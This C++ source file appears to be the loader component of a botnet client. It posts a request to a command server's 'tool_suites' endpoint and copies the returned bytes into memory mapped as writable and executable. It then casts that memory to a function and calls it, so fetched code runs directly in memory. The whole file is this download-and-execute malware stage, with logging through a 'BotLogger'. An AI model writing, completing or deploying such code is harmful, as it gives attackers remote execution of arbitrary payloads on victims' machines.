#include "LoaderModule.h"
#include "BotLogger.h"
#include <sys/mman.h>

LoaderModule::LoaderModule(const std::string &server_address, int server_port)
    : NetworkModule(server_address, server_port) {}

LoaderModule::~LoaderModule() { get_socket().lowest_layer().close(); }

std::string LoaderModule::get_module_name() const { return "loader"; }

void LoaderModule::execute_tool(const std::vector<std::byte> &tool) {
  if (tool.empty()) {
    BotLogger::getInstance().save_log("Tool data is empty. Skipping execution.",
                                      LogLevel::ERROR, BotModules::LOADER);
    return;
  }

  BotLogger::getInstance().save_log("Preparing tool execution...",
                                    LogLevel::INFO, BotModules::LOADER);

  void *executable_memory =
      mmap(nullptr, tool.size(), PROT_READ | PROT_WRITE | PROT_EXEC,
           MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
  if (executable_memory == MAP_FAILED) {
    BotLogger::getInstance().save_log("Failed to allocate memory for tool",
                                      LogLevel::ERROR, BotModules::LOADER);
    return;
  }

  if (tool.size() < 4) {
    BotLogger::getInstance().save_log("Tool too small to be executable",
                                      LogLevel::ERROR, BotModules::LOADER);
    munmap(executable_memory, tool.size());
    return;
  }

  std::stringstream ss;
  ss << "Executable memory first bytes:";
  for (size_t i = 0; i < std::min<size_t>(16, tool.size()); ++i)
    ss << " " << std::hex << std::to_integer<int>(tool[i]);
  BotLogger::getInstance().save_log(ss.str(), LogLevel::DEBUG,
                                    BotModules::LOADER);

  // Optional: check for known binary prefix
  if (tool[0] != std::byte{0x55}) { // example: 0x55 = x86 `push rbp`
    BotLogger::getInstance().save_log(
        "Tool does not start with known executable prefix", LogLevel::ERROR,
        BotModules::LOADER);
    munmap(executable_memory, tool.size());
    return;
  }

  std::memcpy(executable_memory, tool.data(), tool.size());

  // Cast only after verifying mmap and memcpy succeeded
  auto function = (void (*)())(executable_memory);
  try {
    BotLogger::getInstance().save_log("Executing tool...", LogLevel::INFO,
                                      BotModules::LOADER);
    function();
  } catch (const std::exception &e) {
    BotLogger::getInstance().save_log("Tool execution threw an exception",
                                      LogLevel::ERROR, BotModules::LOADER);
    BotLogger::getInstance().save_exception(e, LogLevel::ERROR,
                                            BotModules::LOADER);
  }

  munmap(executable_memory, tool.size());
  BotLogger::getInstance().save_log("Tool executed successfully",
                                    LogLevel::INFO, BotModules::LOADER);
}

void LoaderModule::download_tool(const nlohmann::json &tool_suite) {
  try {

    // if (!connect_to_server()) {
    //   return;
    // }
    BotLogger::getInstance().save_log("Downloading tool...", LogLevel::INFO,
                                      BotModules::LOADER);
    std::vector<std::byte> tool_data =
        BotEssentials::getInstance().json_to_bytes(tool_suite);
    std::vector<std::byte> response;
    send_https_post_request(m_api_endpoints["tool_suites"], tool_data, response,
                            "application/json");

    if (response.empty()) {
      BotLogger::getInstance().save_log("Received empty response from server",
                                        LogLevel::ERROR, BotModules::LOADER);
      return;
    }
    BotLogger::getInstance().save_log("Received response from server: " +
                                          std::to_string(response.size()),
                                      LogLevel::INFO, BotModules::LOADER);
    execute_tool(response);
  } catch (const std::exception &e) {
    BotLogger::getInstance().save_log("Failed to download tool",
                                      LogLevel::ERROR, BotModules::LOADER);
    BotLogger::getInstance().save_exception(e, LogLevel::ERROR,
                                            BotModules::LOADER);
  }
}

void LoaderModule::execute_module(const nlohmann::json &instructions) {
  try {
    BotLogger::getInstance().save_log("Executing Loader module...",
                                      LogLevel::INFO, BotModules::LOADER);
    // for (const auto &instruction : instructions) {
    nlohmann::json download_instructions;
    if (instructions.contains("tool_suite")) {
      download_instructions["tool_suite"] = instructions["tool_suite"];
      download_tool(download_instructions);
    }
    //}
  } catch (const std::exception &e) {
    BotLogger::getInstance().save_log("Failed to execute Loader module",
                                      LogLevel::ERROR, BotModules::LOADER);
    BotLogger::getInstance().save_exception(e, LogLevel::ERROR,
                                            BotModules::LOADER);
  }
}
